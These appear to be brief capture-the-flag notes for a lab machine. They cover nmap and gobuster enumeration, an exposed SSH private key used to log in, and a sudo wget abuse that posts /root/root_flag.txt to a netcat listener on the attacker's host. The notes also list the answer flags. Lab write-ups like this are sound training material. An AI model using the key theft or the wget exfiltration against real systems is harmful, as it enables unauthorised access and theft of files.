export ip=10.10.29.117
```
User flag
057c67131c3d5e42dd5cd3075b198ff6
```
```
Root flag
b1b968b37519ad1daa6408188649263d
```
```
nmap scan
# Nmap 7.80 scan initiated Wed Jun 24 11:03:07 2020 as: nmap -sC -sV -oN nmap.txt 10.10.29.117
Nmap scan report for 10.10.29.117
Host is up (0.14s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 24 11:03:40 2020 -- 1 IP address (1 host up) scanned in 32.89 seconds

```
gobuster $ip/
```
10.10.29.117/sitemap
```
```
$ip/index.html
 <!-- Jessie don't forget to udate the webiste -->
```
gobuster 10.10.29.117/sitemap
```
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/sass (Status: 301)
```
```
gobuster dir -u http://10.10.29.117/sitemap -w /usr/share/dirb/wordlists/common.txt 
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.ssh (Status: 301)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
```
$ip/sitemap/.ssh/id_rsa

ssh jessie@$ip -i id_rsa

```
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

kali box: nc -lvnp 4445

sudo wget --post-file /root/root_flag.txt 10.9.9.96:4445

kali box: b1b968b37519ad1daa6408188649263d
```